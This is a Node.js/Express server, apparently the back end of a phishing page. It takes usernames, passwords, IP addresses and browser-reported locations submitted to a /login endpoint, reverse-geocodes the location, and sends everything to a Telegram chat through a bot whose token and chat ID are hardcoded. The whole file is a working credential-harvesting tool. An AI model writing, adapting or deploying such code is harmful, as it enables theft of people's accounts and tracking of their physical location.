const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios'); // Para geocodificação

const app = express();
app.use(bodyParser.json());
app.use(cors()); // Habilitar CORS para todas as origens

// Usar variáveis de ambiente para token e chatId (configuradas no Render)
const token = process.env.TOKEN || '7618938431:AAHrrR5AEdE4pirgLf_02TPX5hePY9tHb5Y';
const chatId = process.env.CHAT_ID || '5114449108';
const bot = new TelegramBot(token, { polling: true });

// Função para obter endereço a partir de coordenadas usando Nominatim
async function getAddressFromCoordinates(latitude, longitude) {
    try {
        const response = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
        );
        const address = response.data.display_name || 'Endereço não encontrado';
        return address;
    } catch (error) {
        console.error('Erro na geocodificação:', error.message);
        return 'N/A';
    }
}

// Configurar endpoint para receber dados do formulário
app.post('/login', async (req, res) => {
    const { username, password, latitude, longitude } = req.body;
    
    // Capturar o IP real do cliente
    const clientIp = req.headers['x-forwarded-for'] || req.ip;

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Usuário e senha são obrigatórios' });
    }

    // Obter endereço a partir das coordenadas, se disponíveis
    let address = 'N/A';
    if (latitude && longitude) {
        address = await getAddressFromCoordinates(latitude, longitude);
    }

    // Enviar dados para o Telegram
    const message = `Novo login:\nUsuário: ${username}\nSenha: ${password}\nEndereço: ${address}\nIP: ${clientIp}`;
    bot.sendMessage(chatId, message)
        .then(() => {
            res.json({ status: 'success' });
        })
        .catch((error) => {
            console.error('Erro ao enviar mensagem para o Telegram:', error);
            res.status(500).json({ status: 'error', message: 'Erro ao enviar dados para o Telegram' });
        });
});

// Servir a página HTML
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Iniciar o servidor na porta dinâmica do Render
app.listen(process.env.PORT || 3000, () => {
    console.log(`Servidor rodando na porta ${process.env.PORT || 3000}`);
});

// Comando para obter o Chat ID
bot.onText(/\/getid/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `O Chat ID deste chat é: ${chatId}`);
});

// Resposta básica do bot
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Bot ativo! Use /getid para ver o Chat ID deste chat.');
});